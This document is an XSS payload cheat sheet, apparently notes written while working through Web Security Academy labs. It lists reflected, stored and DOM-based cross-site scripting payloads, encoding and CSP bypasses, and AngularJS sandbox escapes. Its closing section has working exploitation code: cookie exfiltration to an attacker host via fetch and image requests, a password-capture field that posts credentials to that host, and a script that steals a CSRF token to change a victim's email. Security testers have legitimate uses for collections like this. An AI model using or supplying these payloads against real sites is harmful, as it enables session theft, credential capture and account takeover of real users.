```html
<script>alert(1)</script>
--------------------------------------------------------------------------
javascript:alert(1)
--------------------------------------------------------------------------
<img src=x onload=alert(1)>
--------------------------------------------------------------------------
<svg onload=alert(1)>
--------------------------------------------------------------------------
<svg><animatetransform onbegin=alert(1)>
--------------------------------------------------------------------------
<body onload=alert(1)>
--------------------------------------------------------------------------
<script>
window.location.href="https://0a760005048235e381022021000a007e.web-security-academy.net/?search=
<xss id='xssid' onfocus='alert(document.cookie)' tabindex='1'></xss>#xssid"
</script>
--------------------------------------------------------------------------
<body onresize=alert(1)>
--------------------------------------------------------------------------
<iframe src="vuln-website.com/?payload=xss<body onresize=alert(1)>" onload=this.style.width='100px'></iframe>
--------------------------------------------------------------------------
<a href="javascript:fetch('/analytics', {
  method:'post',
  body:'/post/postId=5&test='
}, 
x = x => { throw /*comment*/ onerror = alert, 1337 },    // 1
toString = x,                                           // 2
window + '' ,                                           // 3 (coercion)
{ x: '' }                                                // 4 (re-opens something to keep syntax valid)
).finally(_ => window.location = '/')">Back to Blog</a>
--------------------------------------------------------------------------
<svg>
	<a>
		<animate attributeName=href values=javascript:alert(1) />
		<text x=20 y=20>Click me</text>
	</a>
	
--------------------------------------------------------------------------
`<><img src=x onerror=alert(1)`


```

## Reflected XSS Payloads

- **Basic Probes**
  ```text
  "><script>alert(1)</script>
  '><script>alert(1)</script>
  "><img src=x onerror=alert(1)>
  ```

- **HTML Text Node**
  ```text
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  <svg/onload=alert(1)>
  <details/open ontoggle=alert(1)>  <!-- no interaction -->
  ```

- **HTML Attribute**
  ```text
  "><img src=x onerror=alert(1)>
  '" onerror=alert(1) x="
  "><svg/onload=alert(1)>
  javascript:alert(1)  <!-- for href/src -->
  ```

- **Event-Handler Attribute**
  ```text
  );alert(1);//
  alert(1)
  onmouseover=alert(1)
  onfocus=alert(1) autofocus  <!-- auto-trigger -->
  ```

- **JS String/Template**
  ```text
  ');alert(1);//
  ";alert(1);//
  \');alert(1);//
  `;alert(1);//  <!-- template literals -->
  ```

- **URL Context**
  ```text
  javascript:alert(1)
  data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
  vbscript:msgbox(1)  <!-- IE legacy -->
  ```

- **CSS/Style**
  ```text
  url("javascript:alert(1)")
  expression(alert(1))  <!-- old IE -->
  -o-link:'javascript:alert(1)';-o-link-source:current  <!-- old Opera -->
  ```

## Stored XSS Payloads

Same base as Reflected, plus persistence-focused:

- **Standard Persistent**
  ```text
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  GIF89a;<script>alert(1)</script>  <!-- upload disguise -->
  ```

- **SVG Runtime Mutation**
  ```text
  <svg><animate attributeName="href" to="javascript:alert(1)" begin="0s"></animate></svg>
  <svg><a><animate attributeName=href values=javascript:alert(1)></animate><text x=20 y=20>Click me</text></a></svg>
  <svg><set attributeName="href" to="javascript:alert(1)" begin="accessKey(a)"></set></svg>  <!-- key trigger -->
  ```

- **No-Interaction / Blind**
  ```text
  <body onresize=print()>  <!-- + iframe resize -->
  <iframe src="javascript:alert(1)"></iframe>
  <script src="//attacker.com/log.js"></script>
  <img src="https://attacker.com/?xss=1">
  ```

## DOM-Based XSS Payloads

- **DOM Sinks (e.g., document.write)**
  ```text
  "><script>alert(1)</script>
  javascript:alert(1)
  #<svg onload=alert(1)>  <!-- hash-based -->
  ```

- **InnerHTML**
  ```text
  trVeH9y<svg onload=alert(1)>
  <img src=x onerror=alert(1)>
  ```

- **Eval**
  ```text
  \"};alert(1);//
  1);alert(1);//
  eval(atob('YWxlcnQoMSk='))  <!-- base64 obfuscation -->
  ```

- **jQuery / Location**
  ```text
  javascript:alert(1)
  /onload=alert(1)
  ```

- **AngularJS Sandbox Bypass**
  ```text
  {{$on.constructor('alert(1)')()}}
  {{constructor.constructor('alert(1)')()}}
  ```

- **JS URL Advanced (Coercion)**
  ```text
  ,x=x=>{throw/*comment*/onerror=alert,1},toString=x,window+'',{x:''}
  alert(1)//  <!-- post-coercion -->
  ```

- **Polyglots**
  ```text
  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
  ```

## Filtering & Bypass Payloads

- **Encoding Variants**
  ```text
  %3Cscript%3Ealert(1)%3C/script%3E
  %253cscript%253ealert(1)%253c/script%253e  <!-- double -->
  %00<script>alert(1)</script>  <!-- null byte -->
  ```

- **Case / Obfuscation**
  ```text
  <ScRiPt>alert(1)</ScRiPt>
  <!--><script>alert(1)</script>-->
  alert/*$&*/(1)
  ```

- **HPP (HTTP Parameter Pollution)**
  ```text
  param=<script&param=>alert(1)</&param=script>
  ```

- **CSP Evasion**
  ```text
  <script nonce="stolen">alert(1)</script>  <!-- nonce steal -->
  eval('alert(1)')  <!-- if unsafe-eval allowed -->
  <script src=data:;base64,YWxlcnQoMSk=></script>  <!-- if data: allowed -->
  ```

## Exploitation Payloads

- **Cookie Exfil**
  ```html
  <script>new Image().src="https://attacker/?c="+document.cookie</script>
  <script>fetch('https://attacker/',{method:'POST',body:document.cookie})</script>
  ```

- **Password Capture**
  ```html
  <input name=username id=username>
  <input type=password name=password onchange="if(this.value.length)fetch('https://attacker/',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});">
  ```

- **CSRF via XSS**
  ```javascript
  <script>
  fetch('/my-account')
    .then(r => r.text())
    .then(html => {
      const doc = new DOMParser().parseFromString(html, 'text/html');
      const token = doc.querySelector('input[name="csrf"]').value;
      fetch('/my-account/change-email', {
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:'email=evil@evil.com&csrf='+token
      });
    });
  </script>
  ```
